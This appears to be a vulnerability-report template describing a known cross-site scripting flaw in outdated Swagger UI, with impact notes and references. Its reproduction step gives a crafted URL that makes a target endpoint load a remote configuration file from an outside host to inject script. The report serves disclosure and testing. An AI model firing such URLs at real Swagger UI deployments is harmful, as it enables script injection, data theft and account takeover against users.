# Cross-Site Scripting (XSS) Vulnerability in Outdated Swagger UI

#### Description
Swagger UI is a user-friendly web application that allows users to interact with APIs described by the OpenAPI (formerly Swagger) specification. It provides an interface for viewing and testing API endpoints without writing code.

Older versions of Swagger UI contain a known XSS vulnerability that allows an attacker to manipulate application configuration via the `?configUrl` or `?url` query parameters. By supplying a malicious configuration file using these parameters, an attacker can inject arbitrary JavaScript into pages served by Swagger UI—without requiring authentication. The exploit can be delivered under a legitimate-looking URL, increasing the risk of trust exploitation.

#### Steps to Reproduce
1. Navigate to: `{{endpoint}}?configUrl=https://jumpy-floor.surge.sh/test.json`
2. You will see a JavaScript alert box appear, demonstrating successful script injection.

#### Impact
Exploiting this vulnerability enables attackers to execute arbitrary scripts in the victim’s browser. Potential consequences include theft of sensitive user data, phishing campaigns, or unauthorized actions on behalf of the victim, including potential account compromise.

#### References
- [Hacking Swagger UI: From XSS to Account Takeovers – Vidoc Security](https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/)
- [Vidoc Security Public Library Entry](https://app.vidocsecurity.com/public-library/787db825-d8c0-4182-a79f-6c7520745c49)
